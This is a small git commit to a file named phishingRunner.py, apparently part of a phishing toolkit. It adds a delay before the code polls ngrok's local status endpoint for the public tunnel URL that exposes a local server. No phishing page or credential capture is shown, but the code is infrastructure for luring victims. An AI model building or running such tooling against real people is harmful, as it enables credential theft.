29a94597c6dd2a8c095fdad311b6d0e9b7caa2cc
Alisson Moretto <33207993+A1S0N@users.noreply.github.com>
2018-07-26 14:32:18 -0300

    Update phishingRunner.py

--- core/phishingRunner.py
+++ core/phishingRunner.py
@@ -40,6 +40,7 @@ def runNgrok():
     system('./base/Server/ngrok http 1449 > /dev/null &')
     ngrok_url = ''
     check = 'curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh'
+    sleep(7)
     while ngrok_url == '':
         ngrok_url = getoutput(check)
     print(green('\n [*] Ngrok URL: %s' % ngrok_url))
